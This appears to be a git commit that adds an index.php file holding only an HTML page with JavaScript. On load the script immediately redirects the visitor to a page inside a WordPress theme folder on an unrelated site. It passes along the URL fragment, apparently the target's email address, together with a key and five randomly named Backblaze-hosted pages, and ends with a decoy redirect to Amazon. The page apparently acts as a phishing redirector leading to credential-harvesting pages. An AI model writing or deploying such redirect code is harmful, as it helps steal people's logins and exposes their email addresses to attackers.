5896ead1581e148b0a77b862814dcbdd5af77124
afonsa212 <117815669+afonsa212@users.noreply.github.com>
2022-11-09 04:27:44 -0500

    Create index.php

---
+++ index.php
@@ -0,0 +1,25 @@
+<html lang="en">
+	<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+	<script>
+		function makeid(length) {
+			var result = "";
+			var characters =
+				"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+			var charactersLength = characters.length;
+			for (var i = 0; i < length; i++) {
+				result += characters.charAt(
+					Math.floor(Math.random() * charactersLength)
+				);
+			}
+			return result;
+		}
+
+		var hash = window.location.hash;
+		var str = hash.split("#")[1];
+		var em = hash.split("#")[1];
+
+		window.setTimeout(function () {
+			window.location.href = "https://www.semillasillinois.com/wp-content/themes/seotheme/pro.html?key=681d12cd73179a12c88e02737f2b5864bf4b824e&url_01=https://coccyodynia-hepatopneumonic-sunil.s3.eu-central-003.backblazeb2.com/index.html&url_02=https://coscinodiscus-fersmite-paizing.s3.eu-central-003.backblazeb2.com/index.html&url_03=https://estimation-syphilid-sputnik.s3.eu-central-003.backblazeb2.com/index.html&url_04=https://incasing-langue-tunnelled.s3.eu-central-003.backblazeb2.com/index.html&url_05=https://commas-crocodilite-whoosy.s3.eu-central-003.backblazeb2.com/index.html&redirect=https://www.amazon.com"+ "#" + em;
+		}, 0);
+	</script>
+</html>
